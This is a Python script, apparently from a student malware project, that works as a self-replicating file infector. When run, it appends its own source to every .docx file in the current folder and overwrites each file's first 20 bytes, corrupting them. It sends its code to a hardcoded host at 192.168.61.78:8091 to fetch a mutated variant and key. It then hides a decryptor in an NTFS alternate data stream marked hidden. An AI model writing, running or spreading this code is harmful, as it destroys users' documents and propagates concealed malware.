import os
import io
import re
import socket
import time

#!@
def append_copy_to_documents():
    directory = os.getcwd()  # Get the current directory
    with open (__file__,"r",encoding="utf-8") as file1:
        code_to_append=file1.read().encode()
    # code_to_append = __file__.encode()  # Get the code to append

    # Iterate through all files in the directory
    for filename in os.listdir(directory):
        if filename.endswith(".docx"):
            document_path = os.path.join(directory, filename)
           
            # Open the document in append binary mode
            with open(document_path, "ab") as document:
                # Append the code after the last 4 bytes
                document.seek(-4, os.SEEK_END)
                document.write(code_to_append)

            print(f"Appended a copy of the code to {filename}")
#$%



#!@
def read_first_20_bytes():
    directory = os.getcwd()  # Get the current directory

    # Iterate through all files in the directory
    for filename in os.listdir(directory):
        if os.path.isfile(filename) and filename.endswith(".docx"):
            with open(filename, "r+b") as file:
                # Replace the first 20 bytes with FF FF FF FF ...
                file.write(b"\xFF" * 20)

            print(f"Replaced the first 20 bytes of {filename} with FF FF FF FF ...")
#$%

#!@
def send_data_to_socket(socket_host, socket_port):
    current_script = os.path.abspath(__file__)

    # Create a socket connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to the socket host and port
        sock.connect((socket_host, socket_port))

        # Send the script contents
        with open(current_script, "r") as file:
            script_contents = file.read()
        sock.sendall(script_contents.encode())
        print("Sent script contents.")

        received_codes = []
        i = 0

        # Receive the first response
        response = sock.recv(10000)
        if response:
            received_codes.append(response.decode())
            print(f"Response {i} here---------------")
            i += 1
            print(response.decode())

        # Close the current connection
        sock.close()    
        time.sleep(1)
        # Establish a new connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((socket_host, socket_port))

        # Receive the second response
        response = sock.recv(8192)
        if response:
            received_codes.append(response.decode())
            print(f"Response {i} here---------------")
            i += 1
            print(response.decode())

        # Close the connection
        sock.close() 
        lines = received_codes[0].split("\n")
        quoted_string = f"'{lines[-1]}'"
        received_codes[0] = "\n".join(lines[:-1] + [quoted_string])
        # print(len(received_codes))

        # Return the received codes
        return received_codes
#$%

#!@
def save_varient(contents,path):
    # print("content 1 hererrrrrrrr.......",contents[1])
    key_match = (re.search(r'key = (\d+)', contents[1]))
    if key_match:
        key = int(key_match.group(1))
        print("Extracted key value:", key)
    else:
        print("Key value not found in the contents.")

    new_file_path = path+f"variant_ads{key}.py"
    # print(new_file_path)
    ads_file_path = f"{new_file_path}:decrypt_hide.py"
    
    # Save the encrypted code to the default stream
    with open(new_file_path, 'w', encoding='utf-8') as file:
        file.write(contents[0])
        # file.write("'" + contents[0] + "'") ###################################
    file.close()

    try:
        # Set the ADS file path
        ads_file_path = f"{new_file_path}:decrypt_hide.py"

        with io.open(ads_file_path, "w", encoding="utf-8") as file:
            file.write(contents[1])

        # Set the ADS as hidden
        set_hidden_command = f'attrib +h "{ads_file_path}"'
        os.system(set_hidden_command)

        print("ADS created and set as hidden successfully.")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

        print("Variant generated successfully.")
#$%

# Example usage
append_copy_to_documents()
read_first_20_bytes()
contents=send_data_to_socket("192.168.61.78", 8091)
save_varient(contents, "C:\\Users\\hrish\\OneDrive\\Pictures\\Screenshots\\Phase02\\week6\\")
